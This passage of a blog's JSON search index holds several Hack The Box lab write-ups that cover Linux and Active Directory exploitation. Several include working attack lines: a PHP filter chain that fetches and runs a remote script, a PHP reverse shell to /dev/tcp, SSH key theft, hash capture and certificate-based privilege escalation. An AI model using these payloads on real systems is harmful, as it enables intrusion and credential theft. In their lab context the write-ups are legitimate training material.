uses some kind of database or eventually some useful things. I found that image domain contains a git repository (through git_status, git_log, git_commit functions in /var/www/image/index.php -\u0026gt; uitls.php). This led me to believe that I could use that to gain user privileges later on. I decided to dump the repository and bear with me here I did it in the most ghetto way possible, through a local server that acted as a proxy for gitdumper.sh\nimport requests import json from flask import Flask import base64 app = Flask(__name__) @app.route(\u0026#39;/\u0026lt;path:filepath\u0026gt;\u0026#39;) def index(filepath): json_data = { \u0026#39;action\u0026#39;: \u0026#39;b64encode\u0026#39;, \u0026#39;file_url\u0026#39; : \u0026#34;file://\u0026#34; + \u0026#34;/var/www/image/\u0026#34; + filepath } response = requests.post(\u0026#39;http://api.haxtables.htb/v3/tools/string/index.php\u0026#39;, json=json_data) d = json.loads(response.text.strip()) res = base64.b64decode(d[\u0026#34;data\u0026#34;]) return res $ gitdumper.sh http://localhost:5000/.git/ ./dump_repo Then I used the git ls-files to figure what other files are in the folder.\n$ git ls-files actions/action_handler.php actions/image2pdf.php assets/img/forestbridge.jpg includes/coming_soon.html index.php scripts/git-commit.sh utils.php I saw the actions/action_handler.php source code by using the LFI vulnerability.\n\u0026lt;?php include_once \u0026#39;utils.php\u0026#39;; if (isset($_GET[\u0026#39;page\u0026#39;])) { $page = $_GET[\u0026#39;page\u0026#39;]; include($page); # \u0026lt;-- BruhMoment } else { echo jsonify([\u0026#39;message\u0026#39; =\u0026gt; \u0026#39;No page specified!\u0026#39;]); } ?\u0026gt; It is pretty obvious that this code is vulnerable to LFI, and I can use it to gain a reverse shell through PHP Filters. But I can\u0026rsquo;t access this page directly, so I can use the first LFI to execute this LFI to execute the PHP filters RCE\u0026hellip;\nAnd this is me figuring out this after 2 days of trying\u0026hellip;\nI generated a payload with the PHP filter chain generator .\n$ python3 php_filter_chain_generator.py --chain \u0026#39;\u0026lt;?= `curl http://myIp/rev_bash_norm.sh|bash` ;?\u0026gt;\u0026#39; And I hosted a web server containing the rev_bash_norm.sh, I won\u0026rsquo;t show the full monstrosity of the generated filter request but in the end it looked like this:\nPOST /v3/tools/string/index.php HTTP/1.1 Host: api.haxtables.htb Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close Content-Type: application/json Content-Length: 12920 { \u0026#34;action\u0026#34;: \u0026#34;b64encode\u0026#34;, \u0026#34;file_url\u0026#34; : \u0026#34;email@image.haxtables.htb/actions/action_handler.php?page=php://filter/\u0026lt;bruhmoment\u0026gt;\u0026#34; } Whenever executed, this request will spawn a reverse shell.\nThe www-data to svc(user) was honestly too much for me, and I turned to some write-ups.\nThe next section is what I\u0026rsquo;ve tried and failed, feel free to skip it.\n\u0026lt;i-tried-this\u0026gt; I was pretty sure that it has something to do with the git scripts and I only had rwxr-xr-x permissions of the .git folder, so I\u0026rsquo;ve tried to simulate file edit by using the dumped repository and change all the files in the .git directory on the server.\nAnd that was kinda the right approach, but I didn\u0026rsquo;t notice the ssh keys that I needed to retrieve, so I was hard stuck at this, and I went to some write-ups.\n\u0026lt;/i-tried-this\u0026gt;\nCheck gatogamer1155 \u0026rsquo;s write-up for gaining access to the user and retrieve the first flag.\nTLDR:\nCreates an executable file /tmp/readkey with a content that reads the ~/.ssh/id_rsa file and saves it to file. Creates a git attributes file with a new filter called indent: '*.php filter=indent' Sets the Git configuration filter.indent.clean to the command /tmp/readkey. This tells Git to apply the indent filter to files ending in .php and to use the /tmp/readkey command to process the filter. Execute the /var/www/image/scripts/git-commit.sh with sudo -u svc The filter is then applied, and you can read the private key file. NOTE: Make sure that whenever you save the private key on your machine add an empty line at the end of the file otherwise you will get an error!\nAfter logging with the svc user, you can read the first flag.\nFlag 2 Honestly, this was too easy, but I didn\u0026rsquo;t mind it since I spent too much time doing this box.\nExecuting the sudo -l would give you the executables that you can execute as root.\n(root) NOPASSWD: /usr/bin/systemctl restart * I had to create a service that looks like that and place it under /etc/systemd/system/syl.service\n[Service] Type=simple ExecStart=chmod +s /bin/bash [Install] WantedBy=multi-user.target And simply execute:\n$ sudo /usr/bin/systemctl restart syl $ bash -p bash-5.1# cat root/root.txt . . . ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-02-17-htb-encoding\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-10-htb-escape\/": {
        "title": "Hack The Box - Escape [Medium]",
        "tags": [],
        "content": "This is a Windows Machine which is part of an Active Directory. I would try my best to explain the stuff that I did, since that I\u0026rsquo;ve seen pretty bad write-ups that are not explaining anything. I also want to be honest, and I will link every write-up that I used to exploit the machine.\nI am still learning Active Directory at the time of writing this, so there might be errors, I will do my best to mitigate that!\nEnumerating I started with a simple nmap scan.\n$ nmap -Pn 10.10.11.202 PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl Now since I am new to Active Directory I turned to https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb to check what I can try.\nEventually, after trying most of them, I landed on smbclient\n$ smbclient --no-pass -L 10.10.11.202 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Public Disk SYSVOL Disk Logon server share This is a list of shared folders, the one that we can take a look at is Public\n$ smbclient -N //10.10.11.202/Public Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Sat Nov 19 06:51:25 2022 .. D 0 Sat Nov 19 06:51:25 2022 SQL Server Procedures.pdf A 49551 Fri Nov 18 08:39:43 2022 5184255 blocks of size 4096. 1276406 blocks available smb: \\\u0026gt; get \u0026#34;SQL Server Procedures.pdf\u0026#34; getting file \\SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (62.8 KiloBytes/sec) (average 62.8 KiloBytes/sec) Opening, the PDF states that we can use PublicUser:GuestUserCantWrite1 to log in to the SQL Server. We can use the impacket-mssqlclient which is a tool\n$ impacket-mssqlclient WORKGROUP/PublicUser:GuestUserCantWrite1@10.10.11.202 Once I was in I started enumerating the database, looking at this and that, but I had no luck, I turned to some write-ups to follow up.\nNow most of the write-ups are just skipping the explanation of this step, but I think that it is really important to know what\u0026rsquo;s going on, so I will do my best to explain it.\nFollowing up this https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack attack, I tried the following thing:\nI checked if I can execute xp_dirtree:\nSQL\u0026gt; EXEC sp_helprotect \u0026#39;xp_dirtree\u0026#39;; Owner Object Grantee Grantor ProtectType Action Column ------ -------------------- ------------ ------- ----------- -------------- ------ sys xp_dirtree public dbo b\u0026#39;Grant \u0026#39; Execute . It turns out I can, so to capture the authentication hash, I need to set up an SMB server:\n# My Machine $ impacket-smbserver -smb2support smb ./smb And then to execute the xp_dirtree on the SQL Server\nSQL\u0026gt; exec master.dbo.xp_dirtree \u0026#39;\\\\\u0026lt;myIP\u0026gt;\\smb\u0026#39; Doing this would catch the AUTHENTICATE_MESSAGE, the user and the hash.\n$ impacket-smbserver -smb2support smb ./smb Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed [*] Incoming connection (10.10.11.202,52180) [*] AUTHENTICATE_MESSAGE (sequel\\sql_svc,DC) [*] User DC\\sql_svc authenticated successfully [*] sql_svc::sequel:aaaaaaaaaaaaaaaa:84e0a29415d2823f80593c9bc45d158c:010100000000000080fba2b8945ed9010f6267444f7024440000000001001000780056007a005000590061005000570003001000780056007a0050005900610050005700020010006c004f0054006f006f00540076007700040010006c004f0054006f006f005400760077000700080080fba2b8945ed90106000400020000000800300030000000000000000000000000300000c57e7de4e6e8e7baebb297a4bfc1a9019bc96f8f58ffbd9cb233cec428ece87f0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310034002e003100340032000000000000000000 Now I need to crack the hash, I won\u0026rsquo;t post the results here, so you have to figure that one on your own, it is simple enough! :)\nUsing the cracked password, I can log in using the evil-winrm\n$ evil-winrm --ip 10.10.11.202 --user sql_svc --password $(cat ./password) Now, we need to start enumerating again. I used winPEAS *Evil-WinRM* PS C:\\Users\\sql_svc\\Documents\u0026gt; upload /home/syl/tools/win/winPEASany.exe I eventually stumbled across interesting files and I\u0026rsquo;ve enumerated the users. The interesting file was C:\\SQLServer\\Logs\\ERRORLOG.BAK and upon further inspection I\u0026rsquo;ve got the password for the user Ryan.Cooper.\n$ evil-winrm --ip 10.10.11.202 --user Ryan.Cooper --password $(cat ./password ryan_password) ... *Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; gc ../Desktop/user.txt \u0026lt;user_hash\u0026gt; Now I needed to escalate, I\u0026rsquo;ve used this guide for misconfigured certificates that cause AD CS Domain Escalation. https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation I\u0026rsquo;ve uploaded Certify to the SQL Server (user login) and tried to find vulnerable certificates.\nNOTE: Certify is a tool to enumerate and abuse misconfigured AD CS, you can find its source code here: https://github.com/GhostPack/Certify . Unfortunately(or fortunately) there aren\u0026rsquo;t any prebuilt binaries and you have to build it yourself. It is well explained in the README.\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; ./Certify.exe find /vulnerable ... [!] Vulnerable Certificates Templates : CA Name : dc.sequel.htb\\sequel-DC-CA Template Name : UserAuthentication Schema Version : 2 Validity Period : 10 years Renewal Period : 6 weeks msPKI-Certificate-Name-Flag : ENROLLEE_SUPPLIES_SUBJECT mspki-enrollment-flag : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS Authorized Signatures Required : 0 With that tool, I found a vulnerable certificate that I can use to impersonate an administrator. Following up the attack on hacktricks:\n*Evil-WinRM* PS C:\\Users\\Ryan.Cooper\\Documents\u0026gt; .\\Certify.exe request /ca:dc.sequel.htb\\sequel-DC-CA /template:UserAuthentication /altname:administrator ... CERTIFICATE ... [*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP \u0026#34;Microsoft Enhanced Cryptographic Provider v1.0\u0026#34; -export -out cert.pfx I\u0026rsquo;ve downloaded the certificate on my machine and ran the command to convert it to pfx and I\u0026rsquo;ve uploaded it back to the server.\nUsing another tool called Rubeus that I\u0026rsquo;ve used to send raw request for a TGT towards the DC.\n$ ./Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /getcredentials /password:123 [*] Action: Ask TGT [*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb [*] Building AS-REQ (w/ PKINIT preauth) for: \u0026#39;sequel.htb\\administrator\u0026#39; [*] Using domain controller: fe80::5438:a078:e66d:b560%4:88 [+] TGT request successful! [*] base64(ticket.kirbi): ... [*] Getting credentials using U2U CredentialInfo : Version : 0 EncryptionType : rc4_hmac CredentialData : CredentialCount : 1 NTLM : \u0026lt;NTLM HASH\u0026gt; Now, that gave me the NTLM Hash, which is the cryptographic format in which user passwords are stored on Windows systems.\nI can use that with:\n$ evil-winrm -H \u0026#34;\u0026lt;NTLM HASH\u0026gt;\u0026#34; -u \u0026#34;administrator\u0026#34; -i 10.10.11.202 M* PS C:\\Users\\Administrator\\Documents\u0026gt; gc ../Desktop/root.txt \u0026lt;root_hash\u0026gt; References https://blog.zerospl0it.com/posts/Escape/ https://yu8pentest.blogspot.com/2023/02/escape.html https://medium.com/@Kushagra007/writeup-escape-hackthebox-dbee2d761d15 https://breached.vc/Thread-Escape-HTB-Discussion?highlight=escape ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-10-htb-escape\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-05-10-htb-inject\/": {
        "title": "Hack The Box - Inject [Easy]",
        "tags": [],
        "content": "The machine is labeled misleadingly easy, but that can lead you to miss stuff, so make sure to check everything!\nA simple nmap scan shows us that 8080 port is open.\nNmap scan report for 10.10.11.204 Host is up (0.13s latency). Not shown: 998 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 caf10c515a596277f0a80c5c7c8ddaf8 (RSA) | 256 d51c81c97b076b1cc1b429254b52219f (ECDSA) |_ 256 db1d8ceb9472b0d3ed44b96c93a7f91d (ED25519) 8080/tcp open nagios-nsca Nagios NSCA |_http-title: Home Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Let\u0026rsquo;s start by simply inspecting the website that is running on port :8080.\nThe website seems like it has an upload form that we can upload images, my initial thought was LFI vulnerability, so I\u0026rsquo;ve checked it and I found it.\nhttp://10.10.11.204:8080/show_image?img=\u0026lt;vulnerable to LFI\u0026gt; Now I\u0026rsquo;ve wandered around exploring the website\u0026rsquo;s source code and after a bit of digging and searching I was on the verge of giving up. Since the machine is labeled easy, I didn\u0026rsquo;t exactly expect that the way to find a vulnerability is through https://spring.io/security/cve-2022-22963 (CVE-2022-22963) and I overlooked the versions that were listed in the maven build file (which you could exfiltrate from the LFI vulnerability).\nAfter that, a reverse shell using this https://github.com/lemmyz4n3771/CVE-2022-22963-PoC POC was easy-peasy.\nWhile enumerating the users, we can see that we have root, phil ,frank and a group that is called staff. So changing from frank to phil was through /home/frank/.m2/settings.xml which had the credentials to change the user to phil.\nYou can get your first flag after that.\nChanging to root was a bit tricky at first since I was trying to create a new playbook, which caused some errors and I finally decided to use the currently created one with the following payload.\n$ echo \u0026#39;[{hosts: localhost, tasks: [shell: /bin/sh \u0026lt;/dev/tty \u0026gt;/dev/tty 2\u0026gt;/dev/tty]}]\u0026#39; \u0026gt; ./playbook_1.yml \u0026lt;blabla\u0026gt; $ bash -p $ whoami root And there we have it!\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-05-10-htb-inject\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-06-08-htb-interface\/": {
        "title": "Hack The Box - Interface [Medium]",
        "tags": [],
        "content": "The most important in this machine would be the enumeration, it exploits vulnerabilities like:\nCVE-2022-28368 Executing files with sudo privileges Recon I started with just the website interface.htb where there isn\u0026rsquo;t much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.\nHTTP/1.1 200 OK Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:44:41 GMT Content-Type: text/html; charset=utf-8 Connection: close Content-Security-Policy: script-src \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39; \u0026#39;self\u0026#39; data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src \u0026#39;self\u0026#39; http://prd.m.rendering-api.interface.htb; style-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:; X-Powered-By: Next.js ETag: \u0026#34;i8ubiadkff4wf\u0026#34; Vary: Accept-Encoding Content-Length: 6359 I saw the CSP header which has a bunch of websites in, and frankly I didn\u0026rsquo;t spot the subdomain at first, but that was the next pivoting point http://prd.m.rendering-api.interface.htb.\nGoing to the subdomain, you are greeted by a single File not Found text with a 404 status. Here comes the tricky part, the usual reconning using ffuf,feroxbuster and such, are ignoring the 404 status over the things it finds, and it\u0026rsquo;s tricky to set something that is working for this particular case.\n$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0 I found several endpoints that are returning more than just 404.\napi/experiments/configurations [Status: 404, Size: 50, Words: 3, Lines: 1... api/experiments [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: api [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: vendor [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: Using curl, I found some API responses over those endpoints.\n$ curl -i http://prd.m.rendering-api.interface.htb/api/ HTTP/1.1 404 Not Found Server: nginx/1.14.0 (Ubuntu) Date: Tue, 14 Feb 2023 08:53:49 GMT Content-Type: application/json Transfer-Encoding: chunked Connection: keep-alive {\u0026#34;status\u0026#34;:\u0026#34;404\u0026#34;,\u0026#34;status_text\u0026#34;:\u0026#34;route not defined\u0026#34;} Then I began enumerating the API, by filtering the 404 using a GET request.\nThe tricky thing is that you must try to use all the methods GET,POST,PUT,DELETE on everything. That could have been easier with feroxbuster but the thing is that on the feroxbuster tool there isn\u0026rsquo;t an -mc all option which matches all the response codes and I had to do it manually with ffuf.\nThis is what I\u0026rsquo;ve used to find another pivot point.\n$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -mc all -fs 50 -X POST ... html2pdf [Status: 422, Size: 36, Words: 2, Lines: 1... I found other stuff like composer,dumpdf before that and I started to search some exploits for dumpdf since I thought that would be the next pivot point and found this PoC of an exploit: https://github.com/positive-security/dompdf-rce .\nThe next thing to figure out was how to pass the file to that endpoint. While I tried to just send the file without any parameters, it returns missing parameters so I had to explore the dompdf implementations. The parameters that dompdf uses are just two.\n$dompdf-\u0026gt;loadHtml($html); $dompdf-\u0026gt;setPaper(\u0026#39;A4\u0026#39;, \u0026#39;landscape\u0026#39;); $dompdf-\u0026gt;render(); I know that this is an API, so it must accept some JSON, so I crafted some random payload which I admit I got really lucky.\n{ \u0026#34;html\u0026#34;: \u0026#34;\u0026lt;h1\u0026gt;test\u0026lt;/h1\u0026gt;\u0026#34;, \u0026#34;paper\u0026#34;: \u0026#34;A4\u0026#34; } Because the response was 200 OK and a binary with the attached PDF.\nExploiting the dumpdf RCE The dumpdf is apparently caching the fonts that it processes during the conversion of HTML to PDF. It stores them under /vendor/dompdf/dompdf/lib/fonts/ folder. Earlier in my discovery I enumerated another possible pivoting point that however gave 403, which was /vendor/dompdf/dompdf so following the PoC I\u0026rsquo;ve crafted the following payload.\nPOST /api/html2pdf HTTP/1.1 Host: prd.m.rendering-api.interface.htb Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Content-Type: application/json Connection: close Content-Length: 47 { \u0026#34;html\u0026#34;: \u0026#34;\u0026lt;link rel=stylesheet href=\u0026#39;http://10.10.14.73:8000/syl.css\u0026#39;\u0026gt;\u0026#34;, \u0026#34;paper\u0026#34;: \u0026#34;A4\u0026#34; } # syl.css @font-face { font-family:\u0026#39;syl\u0026#39;; src:url(\u0026#39;http://10.10.14.73:8000/syl.php\u0026#39;); font-weight:\u0026#39;normal\u0026#39;; font-style:\u0026#39;normal\u0026#39;; } # syl.php, this is a legit font just with 1 line PHP on the bottom \u0026lt;LEGIT FONT BINARY DATA\u0026gt; \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt; /dev/tcp/10.10.14.73/4444 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; After that I execute the request, the server would try to get the CSS and the font from my server, and it would cache the font into the specified folder and after executing the request. I saw that it does exactly that:\n# My Server logs 10.129.20.249 - - [14/Feb/2023 11:20:07] \u0026#34;GET /syl.css HTTP/1.0\u0026#34; 200 - 10.129.20.249 - - [14/Feb/2023 11:20:07] \u0026#34;GET /syl.php HTTP/1.0\u0026#34; 200 - That means that we have our \u0026lsquo;font\u0026rsquo; already cached on the server under the folder /vendor/dompdf/dompdf/lib/fonts/ however what would be the name, because trying to execute syl.php wasn\u0026rsquo;t yielding results.\nTo figure that out I thought it might be several things, md5(file), md5(url of the font), some_hashing_algo(file/url of the font) so I had to research how it saves the fonts. Fortunately, the PoC gives us a clue of how is this working. The font file there is named exploitfont_normal_3f83639933428d70e74a061f39009622.php and I brute forced my way out of this by trying syl_normal_ and md5(file), md5(url of the font) and the URL of the font was the right one, so I got a reverse shell with that.\n$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/syl_normal_ee17d95350fea4e27875b56170439107.php ... $ nc -lnvp 4444 listening on [any] 4444 ... connect to [10.10.14.73] from (UNKNOWN) [10.129.20.249] 60822 pwd /var/www/api/vendor/dompdf/dompdf/lib/fonts With that and using linpeas.sh I could read the first flag which is located in /home/dev/user.txt.\nGaining Root This was a tricky one, and I got some help with it since I couldn\u0026rsquo;t find how. I only found a script that was cleaning some cache files with the tag Producer: dompdf in the /tmp folder. The script is located here: /usr/local/sbin/cleancache.sh. I was pretty sure that this is the root pivot point, but I didn\u0026rsquo;t know how to exploit it.\nI joined some discussions and one of the users mentioned the # Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too - https://www.vidarholen.net/contents/blog/?p=716 I didn\u0026rsquo;t know that you could do that, but after reading the article it was clear what I should do.\n$ cd /tmp $ mkdir syl $ cd syl \u0026amp;\u0026amp; wget http://10.10.14.73:8000/admin.sh $ chmod +x ./admin.sh $ wget http://10.10.14.73:8000/test.pdf $ exiftool -Producer=\u0026#39;a[$(/tmp/syl/admin.sh\u0026gt;\u0026amp;2)]+42\u0026#39; test.pdf \u0026lt; -Producer=\u0026#39;a[$(/tmp/syl/admin.sh\u0026gt;\u0026amp;2)]+42\u0026#39; test.pdf 1 image files updated $ /usr/local/sbin/cleancache.sh /usr/local/sbin/cleancache.sh chmod: changing permissions of \u0026#39;/bin/bash\u0026#39;: Operation not permitted chmod: changing permissions of \u0026#39;/bin/bash\u0026#39;: Operation not permitted $ /bin/bash -p bash-4.4# cat /root/root.txt ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-06-08-htb-interface\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-02-10-htb-investigation\/": {
        "title": "Hack The Box - Investigation [Medium]",
        "tags": [],
        "content": " This box consist of several vulnerabilities:\nCommand Injection - Used a vulnerability in exiftool that allowed me to run arbitrary code. Leaked Credentials - Then we found the .msg file which contained an event logs from a Windows machine where we found the credentials for user smorton. I wasted a lot of time an effort to figure that one out, so don\u0026rsquo;t be discouraged when you can\u0026rsquo;t find it in the first 5 mins. Sudo commands - We then found the mysterious /usr/bin/binary file that we could use sudo with and that led us to analyze it further where we found that it accepts 2 arguments, and it downloads a file, saves it with a specific name and runs it using perl. References https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/ https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429 ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-02-10-htb-investigation\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-08-06-htb-irked\/": {
        "title": "Hack The Box - Irked [Easy]",
        "tags": [],
        "content": "Here is a quick xmind map.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-08-06-htb-irked\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-08-05-htb-joker\/": {
        "title": "Hack The Box - Joker [Hard]",
        "tags": [],
        "content": "Here is a quick xmind map.\n", 
        "url": "http:\/\/localhost:1313\/posts\/2023-08-05-htb-joker\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-04-21-htb-metatwo\/": {
        "title": "Hack The Box - MetaTwo [Easy]",
        "tags": [],
        "content": "Starting out with rustscan\nOpen 10.10.11.186:21 Open 10.10.11.186:22 Open 10.10.11.186:80 [~] Starting Script(s) [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-21 16:34 EEST Initiating Ping Scan at 16:34 Scanning 10.10.11.186 [2 ports] Completed Ping Scan at 16:34, 0.05s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 16:34 Completed Parallel DNS resolution of 1 host. at 16:34, 0.23s elapsed DNS resolution of 1 IPs took 0.23s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating Connect Scan at 16:34 Scanning 10.10.11.186 [3 ports] Discovered open port 21/tcp on 10.10.11.186 Discovered open port 22/tcp on 10.10.11.186 Discovered open port 80/tcp on 10.10.11.186 Completed Connect Scan at 16:34, 0.05s elapsed (3 total ports) Nmap scan report for 10.10.11.186 Host is up, received syn-ack (0.050s latency). Scanned at 2023-04-21 16:34:41 EEST for 0s PORT STATE SERVICE REASON 21/tcp open ftp syn-ack 22/tcp open ssh syn-ack 80/tcp open http syn-ack We can see that we have an FTP open, this will be of use later on. Going to the main website on port 80 we can see that there is a some sort of blog site. Using whatweb we can get some versions:\nhttp://metapress.htb/events/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0], IP[10.10.11.186], MetaGenerator[WordPress 5.6.2], PHP[8.0.24], PoweredBy[--], Script, Title[Events \u0026amp;#8211; MetaPress], UncommonHeaders[link], WordPress[5.6.2], X-Powered-By[PHP/8.0.24], nginx[1.18.0] We can see that this is a WordPress and the booking thing certainly looks like a plugin, so let\u0026rsquo;s see the name of the plugin:\nGET /wp-content/plugins/bookingpress-appointment-booking/images/front-confirmation-vector.svg HTTP/1.1 Host: metapress.htb User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://metapress.htb/thank-you/?appointment_id=NA== Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: PHPSESSID=cdoa77oamq1dbr9puh51s108jq Connection: close From this request, we can see that the plugin name is bookingpress, a simple google search would yield that this plugin is vulnerable to SQL Injection (CVE-2022-0739).\nUsing that vulnerability, we can get the password for the manager user\nadmin $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. manager $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:partylikearockstar We can now log in into the wp-admin using the manager account.\nFrom there we can see that the dashboard is pretty simple and the only pivoting point would be the upload of the media, so googling around I found CVE-2021-29447 that exposes a XXE vulnerability in the Media Library.\nMore Information I\u0026rsquo;ve used the exact exploit used in the article (with adjusted payloads). The exploit returned some files such as /etc/passwd from where I got the user jnelson, the nginx config etc/nginx/sites-available/default, and the wp-config.php.\nUsing the config from the nginx I saw the path to the WordPress site.\nroot /var/www/metapress.htb/blog; And I\u0026rsquo;ve got the wp-config on this location /var/www/metapress.htb/blog/wp-config.php\ndefine( \u0026#39;FS_METHOD\u0026#39;, \u0026#39;ftpext\u0026#39; ); define( \u0026#39;FTP_USER\u0026#39;, \u0026#39;metapress.htb\u0026#39; ); define( \u0026#39;FTP_PASS\u0026#39;, \u0026#39;9NYS_ii@FyL_p5M2NvJ\u0026#39; ); define( \u0026#39;FTP_HOST\u0026#39;, \u0026#39;ftp.metapress.htb\u0026#39; ); define( \u0026#39;FTP_BASE\u0026#39;, \u0026#39;blog/\u0026#39; ); define( \u0026#39;FTP_SSL\u0026#39;, false ); From there we can log into the FTP, and there we can see the send_email.php file, inspecting it we will see the password for the jnelson. Now, we can log in using ssh.\nThe root credentials are in the ~/pass file.\njnelson@meta2:~$ cat user.txt \u0026lt;hash\u0026gt; jnelson@meta2:~$ cat pass credentials: - comment: \u0026#39;\u0026#39; fullname: root@ssh login: root modified: 2022-06-26 08:58:15.621572 name: ssh password: !!python/unicode \u0026#39;p7qfAZt4_A1xo_0x\u0026#39; - comment: \u0026#39;\u0026#39; fullname: jnelson@ssh login: jnelson modified: 2022-06-26 08:58:15.514422 name: ssh password: !!python/unicode \u0026#39;Cb4_JmWM8zUZWMu@Ys\u0026#39; handler: passpie version: 1.0 jnelson@meta2:~$ su - root Password: root@meta2:~# cat /root/root.txt \u0026lt;hash\u0026gt; root@meta2:~# ", 
        "url": "http:\/\/localhost:1313\/posts\/2023-04-21-htb-metatwo\/"
    },
    
    "http:\/\/localhost:1313\/posts\/2023-05-26-htb-pc\/": {
        "title": "Hack The Box - PC [Easy]",
        "tags": [],
        "content": "This machine has only 2 ports open:\n$ nmap 10.10.11.214 -Pn -p- 22/tcp open ssh 50051/tcp open unknown Using telnet to see what is 50051, we get:\ntelnet 10.10.11.214 50051 Trying 10.10.11.214... Connected to 10.10.11.214. Escape character is \u0026#39;^]\u0026#39;. \u0018\u0004\u0004?�\u0005?�\u0006 �\u0003\u0001?^CConnection closed by foreign host. Which is some random binary data. I\u0026rsquo;ve explored it with hexdump.\n0000000 0000 0418 0000 0000 0000 0004 ff3f 00ff 0000010 0005 ff3f 00ff 0006 2000 fe00 0003 0000 0000020 0001 0400 0008 0000 0000 3f00 0000 000002e I didn\u0026rsquo;t figure out what it was, so I googled the port which led me to this question: https://stackoverflow.com/questions/55990378/i-tried-to-deploy-grpc-go-server-in-docker-and-expose-port-in-local-port-but-p I\u0026rsquo;ve figured out that this is some rpc server. Using grpcui we can see the following app structure.\n$ grpcui -plaintext 10.10.11.214:50051 --- SimpleApp.LoginUser { username string password string } SimpleApp.RegisterUser { username string password string } SimpleApp.getInfo { id string } 